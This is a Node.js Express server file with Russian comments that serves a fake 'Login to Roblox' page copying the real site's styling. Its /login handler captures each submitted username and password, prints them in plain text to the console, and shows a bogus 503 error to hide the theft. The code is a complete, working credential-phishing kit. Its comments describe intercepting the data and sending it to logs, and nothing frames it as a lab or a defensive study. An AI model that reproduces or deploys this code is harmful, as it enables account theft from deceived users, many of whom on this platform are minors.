const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Настройка Express для корректного чтения текстовых данных из HTML-формы
app.use(express.urlencoded({ extended: true }));

// 1. МАРШРУТ ДЛЯ ОТОБРАЖЕНИЯ СТРАНИЦЫ АВТОРИЗАЦИИ
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            background-color: #1a1c20;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }

        .auth-container { 
            background-color: #23252b;
            padding: 32px 28px; 
            border-radius: 8px; 
            width: 100%;
            max-width: 380px; 
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
        }

        h1 {
            color: #ffffff; 
            text-align: center; 
            margin-bottom: 28px; 
            font-size: 26px; 
            font-weight: 700; 
            letter-spacing: -0.3px;
        }

        .input-control { 
            width: 100%; 
            padding: 14px 16px; 
            margin-bottom: 14px; 
            background-color: #2e3138;
            border: 1px solid #3f434a; 
            border-radius: 8px; 
            color: #ffffff; 
            font-size: 15px; 
            transition: all 0.2s ease; 
        }

        .input-control::placeholder { 
            color: #8b8f97; 
        }
        
        .input-control:focus { 
            outline: none; 
            border-color: #ffffff; 
            background-color: #353942;
        }

        .btn-submit { 
            width: 100%; 
            padding: 13px; 
            background-color: transparent; 
            border: 1.5px solid #ffffff; 
            border-radius: 8px; 
            color: #ffffff; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 6px;
            margin-bottom: 22px; 
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        
        .btn-submit:hover { 
            background-color: rgba(255, 255, 255, 0.08); 
        }
        
        .btn-submit:active { 
            transform: scale(0.98); 
        }

        .link-text { 
            display: block; 
            text-align: center; 
            color: #ffffff; 
            font-size: 14px; 
            font-weight: 500; 
            text-decoration: none; 
            margin-bottom: 22px; 
            transition: color 0.2s; 
        }

        .link-text:hover { 
            text-decoration: underline; 
            color: #c5c9d1; 
        }

        .secondary-actions { 
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }

        .btn-secondary { 
            width: 100%; 
            padding: 14px; 
            background-color: #2e3138; 
            border: none; 
            border-radius: 8px; 
            color: #ffffff; 
            font-size: 15px; 
            font-weight: 500; 
            cursor: pointer; 
            transition: background-color 0.2s ease, transform 0.1s ease; 
        }
        
        .btn-secondary:hover { 
            background-color: #383c45; 
        }
        
        .btn-secondary:active { 
            transform: scale(0.98); 
        }

        .signup-text {
            text-align: center;
            color: #ffffff;
            font-size: 14px;
            font-weight: 500;
        }

        .signup-text a {
            color: #ffffff;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-text a:hover {
            text-decoration: underline;
            color: #c5c9d1;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <h1>Login to Roblox</h1>
        
        <form action="/login" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
            <input type="password" name="password" class="input-control" placeholder="Password" required>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
    `);
});

// 2. БЭКЕНД: ПРИЕМ, ПЕРЕХВАТ ДАННЫХ И ИХ ОТПРАВКА В ОНЛАЙН-ЛОГИ
app.post('/login', (req, res) => {
    const userLogin = req.body.username;
    const userPassword = req.body.password;
    
    console.log(`\n========================================`);
    console.log(`[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:`);
    console.log(`ВВЕДЕННЫЙ ЛОГИН: ${userLogin}`);
    console.log(`ВВЕДЕННЫЙ ПАРОЛЬ: ${userPassword}`);
    console.log(`========================================`);
    
    res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
});

// Запуск прослушивания входящего сетевого трафика на сервере
app.listen(PORT, () => {
    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
});
